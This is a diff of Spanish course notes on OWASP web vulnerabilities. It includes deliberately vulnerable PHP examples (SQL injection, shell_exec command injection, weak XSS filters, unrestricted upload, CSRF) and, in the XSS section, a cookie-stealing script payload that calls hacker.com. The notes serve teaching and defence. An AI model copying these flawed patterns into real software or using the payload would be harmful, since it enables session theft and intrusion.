@@ -1,6 +1,6 @@
 # Tema 3: Vulnerabilidades web
 
-## 3.1 Introducción
+## 1. Introducción
 
 - **Vulnerabilidad web**: fallo de seguridad en:
     - Una aplicación web hecha a medida
@@ -13,7 +13,7 @@
         - **HTTP no fue diseñado para ser seguro**
             - Pero es necesario proveer a usuarios externos de contenido alojado internamente
 
-## 3.2 OWASP
+## 2. OWASP
 
 - *Open Web Application Security Project*
 - Proyecto de código abierto dedicado a determinar y combatir las causas que hacen que el software web sea inseguro
@@ -45,7 +45,7 @@
 - Almacenamiento criptográfico inseguro
 - Protección insuficiente en la capa de transporte
 
-## 3.3 Inyección
+## 3. Inyección :red_circle:
 
 - **Manipular las entradas** de una aplicación **para mandar comandos** a algún interprete para que los ejecute
     - **SQL**, Shell del SO, LDAP, XPath, Hibernate, etc.
@@ -68,8 +68,7 @@
 ```php
 <?php
     if isset($_GET['Submit'])){
-        
-        // Retrieve data  
+         
         $id = $_GET['id'];
 
         $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
@@ -100,7 +99,6 @@
 <?php
     if (isset($_GET['Submit'])) {
 
-        // Retrieve data
         $id = $_GET['id'];
         $id = mysql_real_escape_string($id);
 
@@ -137,12 +135,9 @@
 
         $target = $_REQUEST['ip'];
 
-        // Determine OS and execute the ping command.
         if (stristr(php_uname('s'), 'Windows NT')) { 
-        
             $cmd = shell_exec('ping  ' . $target);
             echo '<pre>' . $cmd . '</pre>';
-            
         } else {     
             $cmd = shell_exec('ping  -c 3 ' . $target);
             echo '<pre>' . $cmd . '</pre>';
@@ -159,7 +154,6 @@
 
         $target = $_REQUEST['ip'];
 
-        // Remove any of the charactars in the array (blacklist).
         $substitutions = array(
             '&&' => '',
             ';' => '',
@@ -167,7 +161,6 @@
 
         $target = str_replace(array_keys($substitutions), $substitutions, $target);
         
-        // Determine OS and execute the ping command.
         if (stristr(php_uname('s'), 'Windows NT')) { 
             $cmd = shell_exec( 'ping  ' . $target );
             echo '<pre>' . $cmd . '</pre>';
@@ -179,16 +172,14 @@
 ?>
 ```
 
-## 3.4 Cross Site Scripting (XSS)
+## 4. Cross Site Scripting (XSS) :red_circle:
 
 - Un atacante manda un trozo de código (vector de ataque) al navegador de la víctima aprovechando un fallo en una aplicación web
-
 - Sucede **cuando la aplicación no valida la entrada**
 - Robar sesiones, defacing, introducir malware, ...
 - Formas de sofisticación:
     - **Esconder** el vector de ataque en **tags HTML** (iframes, imágenes, ...)
     - **Codificar** el vector (Unicode)
-
 - Tipos de XSS
     - Persistente (XSS Stored)
         - El código introducido se almacena de manera permanente (BD, ...)
@@ -198,10 +189,10 @@
         - El código inyectado manipula el código JS or variables de la aplicación en vez de los objetos HTML
     - Ejemplo:
 
-        ```text
-        Comentario=“¡Me encanta la web! <script>
-        window.open(http://hacker.com/info.pl?document.cookie)</script>
-        ```
+```text
+Comentario="¡Me encanta la web! <script>
+window.open(http://hacker.com/info.pl?document.cookie)</script>
+```
 
 - **Mitigación**:
     - **Eliminar los fallos** o evitar incluir aplicaciones propensas a XSS
@@ -253,11 +244,9 @@
         $message = trim($_POST['mtxMessage']);
         $name    = trim($_POST['txtName']);
 
-        // Sanitize message input
         $message = stripslashes($message);
         $message = mysql_real_escape_string($message);
 
-        // Sanitize name input
         $name = mysql_real_escape_string($name);
 
         $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
@@ -276,12 +265,10 @@
         $message = trim($_POST['mtxMessage']);
         $name    = trim($_POST['txtName']);
 
-        // Sanitize message input
         $message = trim(strip_tags(addslashes($message)));
         $message = mysql_real_escape_string($message);
         $message = htmlspecialchars($message);
 
-        // Sanitize name input
         $name = str_replace('<script>', '', $name);
         $name = mysql_real_escape_string($name);
 
@@ -292,7 +279,7 @@
 ?>
 ```
 
-## 3.5 Ejecución de código (Command Injection)
+## 5. Ejecución de código (Command Injection)
 
 - Permite la ejecución de código remota "arbitraria"
 - Ejemplo: **Shellshock** ([CVE-2014-6271](<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271>))
@@ -310,14 +297,10 @@
 
         $target = $_REQUEST[ 'ip' ];
 
-        // Determine OS and execute the ping command.
         if (stristr(php_uname('s'), 'Windows NT')) { 
-        
             $cmd = shell_exec( 'ping  ' . $target );
             echo '<pre>'.$cmd.'</pre>';
-            
         } else { 
-        
             $cmd = shell_exec( 'ping  -c 3 ' . $target );
             echo '<pre>'.$cmd.'</pre>';  
         }
@@ -329,11 +312,10 @@
 
 ```php
 <?php
-    if( isset( $_POST[ 'submit'] ) ) {
+    if (isset($_POST[ 'submit'])) {
 
         $target = $_REQUEST[ 'ip' ];
 
-        // Remove any of the charactars in the array (blacklist).
         $substitutions = array(
             '&&' => '',
             ';' => '',
@@ -341,13 +323,10 @@
 
         $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
         
-        // Determine OS and execute the ping command.
         if (stristr(php_uname('s'), 'Windows NT')) { 
-        
             $cmd = shell_exec( 'ping  ' . $target );
             echo '<pre>'.$cmd.'</pre>';
         } else { 
-        
             $cmd = shell_exec( 'ping  -c 3 ' . $target );
             echo '<pre>'.$cmd.'</pre>';  
         }
@@ -355,7 +334,7 @@
 ?>
 ```
 
-## 3.6 Ejecución maliciosa de ficheros (LFI/RFI)
+## 6. Ejecución maliciosa de ficheros (LFI/RFI)
 
 - **No** está en el ranking top 10 de OWASP
 - *Dos tipos*:
@@ -387,13 +366,12 @@
 ```php
 <?php
     $file = $_GET['page'];
-
     $file = str_replace("http://", "", $file);
     $file = str_replace("https://", "", $file);        
 ?>
 ```
 
-## 3.7 Mala autenticación y gestión de sesiones (Session Hijacking)
+## 7. Mala autenticación y gestión de sesiones (Session Hijacking)
 
 - Credenciales y tokens de sesión no bien protegidos
 - Los atacantes pueden obtener contraseñas, claves o tokens → Robo de sesión
@@ -442,7 +420,7 @@
     - Proteger la comunicación
     - Informar a los usuarios sobre los riesgos y consecuencias de aceptar conexiones inseguras
 
-## 3.8 Referencia directa insegura a objetos
+## 8. Referencia directa insegura a objetos
 
 - Referencias a objetos implementados de manera interna
 - Los atacantes pueden manipular estas referencias para acceder a otros objetos sin autorización
@@ -460,7 +438,7 @@
         - Verificar que el valor es correcto
         - **Verificar si el usuario tiene permiso** para acceder al objeto
 
-## 3.9 Cross Site Request Forgery (CSRF)
+## 9. Cross Site Request Forgery (CSRF) :red_circle:
 
 - **Forzar** a la víctima a:
     - **Realizar una petición** HTTP a una aplicación web vulnerable
@@ -492,11 +470,11 @@
 ```php
 <?php            
     if (isset($_GET['Change'])) {
-        // Turn requests into variables
+
         $pass_new = $_GET['password_new'];
         $pass_conf = $_GET['password_conf'];
 
-        if (($pass_new == $pass_conf)){
+        if (($pass_new == $pass_conf)) {
             $pass_new = mysql_real_escape_string($pass_new);
             $pass_new = md5($pass_new);
 
@@ -506,8 +484,7 @@
             echo "<pre> Password Changed </pre>";        
             mysql_close();
         }
-
-        else{        
+        else {        
             echo "<pre> Passwords did not match. </pre>";            
         }
     }
@@ -520,13 +497,13 @@
 <?php 
     if (isset($_GET['Change'])) {
         // Checks the http referer header
-        if ( eregi ( "127.0.0.1", $_SERVER['HTTP_REFERER'] ) ){
+        if (eregi("127.0.0.1", $_SERVER['HTTP_REFERER'])) {
 
             // Turn requests into variables
             $pass_new = $_GET['password_new'];
             $pass_conf = $_GET['password_conf'];
 
-            if ($pass_new == $pass_conf){
+            if ($pass_new == $pass_conf) {
                 $pass_new = mysql_real_escape_string($pass_new);
                 $pass_new = md5($pass_new);
 
@@ -536,8 +513,7 @@
                 echo "<pre> Password Changed </pre>";        
                 mysql_close();
             }
-
-            else{        
+            else {
                 echo "<pre> Passwords did not match. </pre>";            
             }    
         }
@@ -545,7 +521,7 @@
 ?>
 ```
 
-## 3.10 Configuraciones inseguras
+## 10. Configuraciones inseguras
 
 - De todo tipo:
     - En equipos de producción y de desarrollo
@@ -559,14 +535,14 @@
 - **Mitigacion**:
     - **Verificar configuraciones** de todas las **aplicaciones y servicios**
         - Automatización
-        - Guías de “Hardening”
+        - Guías de "Hardening"
     - **Actualizaciones** de seguridad
         - Bibliotecas, SO, aplicaciones
     - Analizar los cambios.
     - Generar reportes para poder analizar posteriormente
     - Software de **análisis de vulnerabilidades**, configuración y parches
 
-## 3.11 URLs mal restringidas
+## 11. URLs mal restringidas
 
 - Relacionado con fallos en:
     - Gestión de autenticación
@@ -588,9 +564,9 @@
 - Verificar que el **servidor deniega peticiones** a tipos de fichero no autorizados por defecto
 - Escaneos rutinarios
 
-## 3.12 Redirecciones y reenvíos
+## 12. Redirecciones y reenvíos
 
-- Mala validación de los parámetros
+- **Mala validación de los parámetros**
     - Páginas de Phishing, por ejemplo, una página de login falsa
     - Páginas de malware (Instalación de toolbars, ...)
     - Exploits para navegador
@@ -608,7 +584,7 @@
     - Validar la redirección mediante un filtro externo como Siteminder
     - Comprobar que el usuario tenga permisos para ver ambas páginas
 
-## 3.13 Subida de archivos sin restricción
+## 13. Subida de archivos sin restricción
 
 1. Conseguir **colar algún código en el sistema** a atacar
 2. Encontrar una manera de ejecutar ese código
@@ -636,18 +612,14 @@
         $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
         $target_path = $target_path . basename( $_FILES['uploaded']['name']);
 
-        if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
-
+        if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
             echo '<pre>';
             echo 'Your image was not uploaded.';
             echo '</pre>';
-
         } else {
-
             echo '<pre>';
             echo $target_path . ' succesfully uploaded!';
             echo '</pre>';
-
         }
     }
     ?>
@@ -667,28 +639,24 @@
 
         if (($uploaded_type == "image/jpeg") && ($uploaded_size < 100000)){
 
-            if(!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
-            
+            if (!move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path)) {
                 echo '<pre>';
                 echo 'Your image was not uploaded.';
                 echo '</pre>';
-                
-                } else {
-            
+            } else {
                 echo '<pre>';
                 echo $target_path . ' succesfully uploaded!';
                 echo '</pre>';
-                
-                }
+            }
         }
-        else{
+        else {
             echo '<pre>Your image was not uploaded.</pre>';
         }
     }
 ?>
 ```
 
-## 3.14 Almacenamiento Criptográfico Inseguro
+## 14. Almacenamiento Criptográfico Inseguro
 
 - Problemas relacionados con como se guarda la información
     - **No se guarda** la **información sensible cifrada**
@@ -714,7 +682,7 @@
             - Cambios de clave
     - **Verificar la implementación**
 
-## 3.15 Protección insuficiente en la capa de transporte
+## 15. Protección insuficiente en la capa de transporte
 
 - **Transmitir datos importantes de manera segura**
     ▪ Varios factores:
